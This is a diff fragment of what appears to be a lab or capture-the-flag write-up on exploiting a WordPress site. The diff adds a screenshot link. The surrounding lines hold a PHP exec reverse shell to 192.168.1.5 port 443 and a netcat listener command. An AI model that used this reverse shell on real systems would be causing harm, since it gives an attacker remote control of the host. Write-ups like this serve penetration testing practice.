@@ -60,7 +60,7 @@ After successfully logged into the website then I navigated to Appearance > Edit
       exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/443 0>&1'");
     ?>
 
-
+![reverse shell](./image/reverse%20shell.png)
 
 ### Netcat listener
  ```nc -lvp 443 ``` Successfully captured reversed shell as deamon@linux user.
